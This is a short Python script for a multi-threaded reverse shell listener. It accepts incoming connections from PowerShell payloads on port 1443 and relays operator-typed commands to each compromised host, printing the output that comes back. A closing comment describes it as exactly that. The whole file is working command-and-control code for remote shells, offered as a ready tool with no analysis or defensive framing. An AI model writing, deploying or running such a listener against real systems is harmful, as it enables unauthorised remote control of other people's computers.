import socket
import threading
from datetime import datetime

def handle_client(conn, addr):
    print(f"[+] Connection from {addr[0]}:{addr[1]} at {datetime.now()}")
    try:
        while True:
            # Receive output from client
            data = conn.recv(4096)
            if not data:
                break
            print(data.decode(errors='ignore'), end='')

            # Prompt operator for input
            cmd = input().strip()
            if cmd.lower() in ['exit', 'quit']:
                break
            conn.sendall((cmd + '\n').encode())  # 🧠 ENSURE NEWLINE
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        conn.close()

def start_listener(host='0.0.0.0', port=1443):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(5)
    print(f"[+] PowerShell listener started on port {port}")
    while True:
        conn, addr = s.accept()
        t = threading.Thread(target=handle_client, args=(conn, addr))
        t.start()

if __name__ == "__main__":
    start_listener()
# This script sets up a PowerShell reverse shell listener that accepts incoming connections
# from PowerShell payloads. It listens on the specified host and port, and spawns a new thread
# for each incoming connection. The listener can send commands to the connected PowerShell shell
# and receive output from it. The connection is closed when the user types 'exit' or 'quit'.
# The script uses threading to handle multiple connections simultaneously.
# The listener is set to bind to all interfaces by default 